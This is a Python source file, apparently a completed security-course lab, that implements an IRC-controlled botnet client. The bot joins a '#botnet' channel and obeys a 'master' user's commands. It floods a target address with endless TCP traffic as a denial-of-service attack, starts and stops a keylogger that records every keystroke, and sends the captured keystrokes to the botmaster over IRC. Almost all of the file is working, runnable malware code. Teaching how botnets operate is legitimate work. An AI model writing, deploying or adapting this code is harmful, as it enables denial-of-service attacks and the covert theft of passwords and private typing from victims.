import pydle, socket, sys, pyxhook

"""
In this lab, you will be writing a simple botnet client with three main pieces of functionality:
    - DOSing an address 
    - Starting and stopping a keylogger
    - Reporting the results of the keylogger

Your bot will join an IRC server and listen for commands from the master user. The IRC endpoint 
is provided via a system argument, as is the bot's username in the server. 

File usage: 
    sudo python3 lab5.py ENDPOINT USERNAME


"""


class MalBot(pydle.Client):

    def on_connect(self):
        self.channel = "#botnet"
        self.log_file_name = 'keylog.txt'
        self.join(self.channel)

    def on_join(self, channel, user):
        super().on_join(channel, user)
        self.message(channel, 'Joined botnet')

    def attack(self, target):
        """
        Given a target, launch a DOS attack at that target by sending the given payload 
        repetedly to the address. 
        You will not need to implement multiple threads for this attack. 

        You may find the following code snippet useful:
        https://gist.github.com/jasenguyen/1312196
        """
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 80))
        print("Connection established")
        payload = str.encode("I'm DDOSing your ass" * 420)
        bytes_sent = 0
        while True:
            s.send(payload)
            print("Bytes sent: {}".format(bytes_sent), end='\r')
            bytes_sent += len(payload)

    def log_keystroke(self, event):
        if event.Ascii==13:
            keystroke='\n'
        elif event.Ascii==8:
            keystroke='<BACK SPACE>'
        elif event.Ascii==9:
            keystroke='<TAB>'
        else:
            keystroke=chr(event.Ascii)
        self.log_file.write(keystroke)

    def start_keylogger(self):
        """
        This function starts the keylogger and also provides the logic that dictates each key press. 
        All logged keys should be written to the log_file, provided under self.log_file_name. 

        The ENTER KEY, (ASCII code 13), should be written as a new line character. 

        You may find the following code snippet useful: 
        https://github.com/hiamandeep/py-keylogger/blob/master/keylogger.py
        """
        self.log_file = open(self.log_file_name, 'a')
        self.keylog_hook = pyxhook.HookManager()
        self.keylog_hook.KeyDown = self.log_keystroke
        self.keylog_hook.HookKeyboard()
        self.keylog_hook.start()

    def stop_keylogger(self):
        self.log_file.close()
        self.keylog_hook.cancel()
    
    def report_keylog(self):
        """
        Read the log file and report the results of the logs line by line to the botmaster
        """
        self.stop_keylogger()
        self.message(self.channel, "Initiating keylogger report")
        self.log_file = open(self.log_file_name, 'r')
        line = self.log_file.readline()
        while line:
            self.message(self.channel, line)
            line = self.log_file.readline()
        self.log_file.close()
        self.start_keylogger()


    def on_message(self, channel, source, message):
        """
        This function is executed on every message, and dictates the actions of the bot 
        through the master's commands. 
        """
        if source != "master":
            return

        if message.startswith("?ddos"):
            address = message.split()[1]
            print("Acknowledged request to DDOS {}".format(address))
            self.attack(address)
        elif message == "?keylogger start":
            print("Starting keylogger")
            self.start_keylogger()
        elif message == "?keylogger stop":
            print("Stopping keylogger")
            self.stop_keylogger()
        elif message == "?keylogger report":
            print("Reporting logged keys to master")
            self.report_keylog()
        else:
            print("Received message from botmaster: {}, relaying it back to botmaster".format(message))
            self.message(self.channel, message)


client = MalBot(sys.argv[2], realname=sys.argv[2])
client.connect(sys.argv[1], 6697, tls=False, tls_verify=False, password="botnet")
client.handle_forever()

